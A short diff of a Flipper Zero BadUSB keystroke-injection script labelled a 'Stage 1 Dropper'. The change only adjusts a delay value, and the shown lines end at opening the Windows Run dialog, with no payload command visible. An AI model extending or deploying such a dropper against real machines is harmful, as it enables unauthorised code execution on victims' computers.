@@ -1,7 +1,7 @@
 REM Project Cerberus - Stage 1 Dropper
 REM Flipper Zero BadUSB Payload
 
-DELAY 1000
+DELAY 1002 #change based on interrupt stuff
 
 REM Open Windows Run dialog
 GUI r
